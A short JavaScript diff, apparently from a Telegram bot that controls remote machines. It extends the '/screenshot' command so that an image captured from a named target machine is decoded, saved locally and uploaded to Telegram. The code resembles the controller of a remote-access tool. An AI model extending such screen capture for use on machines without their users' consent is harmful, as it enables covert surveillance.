@@ -273,8 +273,25 @@ function handleTelegramUpdate(update) {
     case '/screenshot': {
       const target = parts[1];
       if (!target) { sendTelegram('Usage: /screenshot [machine]'); break; }
+      sendTelegram(`Capturing screenshot from *${target}*...`);
       sendCommand(target, 'screenshot', '').then(res => {
-        sendTelegram(`*${target}:* ${res}`);
+        try {
+          const parsed = JSON.parse(res);
+          if (parsed.data) {
+            const buf = Buffer.from(parsed.data, 'base64');
+            const tmpPath = cfg.DOWNLOADS_DIR;
+            try { fs.mkdirSync(tmpPath, { recursive: true }); } catch(e) {}
+            const outFile = path.join(tmpPath, 'screenshot_' + Date.now() + '.png');
+            fs.writeFileSync(outFile, buf);
+            sendFileToTelegram(outFile);
+            const skb = (parsed.size || buf.length) / 1024;
+            sendTelegram(`*${target}:* Screenshot captured (${skb.toFixed(1)}KB)`);
+          } else {
+            sendTelegram(`*${target}:* ${res.slice(0,2000)}`);
+          }
+        } catch(e) {
+          sendTelegram(`*${target}:* ${res.slice(0,2000)}`);
+        }
       });
       break;
     }
